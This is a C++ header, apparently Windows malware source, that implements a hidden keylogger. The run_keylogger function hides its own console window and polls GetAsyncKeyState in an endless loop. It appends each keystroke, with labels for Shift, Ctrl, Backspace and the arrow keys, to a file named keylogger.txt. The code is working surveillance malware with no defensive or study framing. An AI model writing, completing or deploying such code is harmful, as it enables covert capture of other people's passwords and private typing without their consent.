#pragma once

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

void Log(std::string input){
    std::fstream LogFile;
    LogFile.open("keylogger.txt", std::fstream::app);
    if(LogFile.is_open()){
        LogFile << input;
        LogFile.close();
    }
}

bool SpecialKey(int key_character){
    switch (key_character){
        case VK_SPACE:
            std::cout << " ";
            Log(" ");
            return true;
        case VK_RETURN:
            std::cout << "\n";
            Log("\n");
            return true;
        case VK_BACK:
            std::cout << "[BACKSPACE]";
            Log("[BACKSPACE]");
            return true;
        case VK_TAB:
            std::cout << "[TAB]";
            Log("[TAB]");
            return true;
        case VK_SHIFT:
		    std::cout << "[SHIFT]";
		    Log("[SHIFT]");
		    return true;
        case VK_RBUTTON:
		    std::cout << "[R_CLICK]";
		    Log("[R_CLICK]");
		    return true;
        case VK_CAPITAL:
		    std::cout << "[CAPS_LOCK]";
		    Log("[CAPS_LOCK]");
            return true;
        case VK_UP:
            std::cout << "[UP]";
            Log("[UP_ARROW_KEY]");
            return true;
        case VK_DOWN:
            std::cout << "[DOWN]";
            Log("[DOWN_ARROW_KEY]");
            return true;
        case VK_LEFT:
            std::cout << "[LEFT]";
            Log("[LEFT_ARROW_KEY]");
            return true;
        case VK_RIGHT: 
            std::cout << "[RIGHT]";
            Log("[RIGHT_ARROW_KEY]");
            return true;
        case VK_CONTROL:
		    std::cout << "[CTRL]"; 
		    Log("[CTRL]");
		    return true;
        case VK_OEM_PERIOD:
        std::cout << "."; 
		    Log(".");
		    return true;
    }
    return false;
}

void run_keylogger(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while(true){
        Sleep(10);
        for(int key = 8; key <= 190; key ++ ){
            if(GetAsyncKeyState(key) == -32767){
                if(SpecialKey(key) == false){
                    std::fstream LogFile;
                    LogFile.open("keylogger.txt", std::fstream::app);
                    if(LogFile.is_open()){
                          if (key >= 32 && key <= 126){
                                Log(std::string(1, char(key)));
                          }
                          LogFile.close();
                    }
                }
            }
        }
    }
}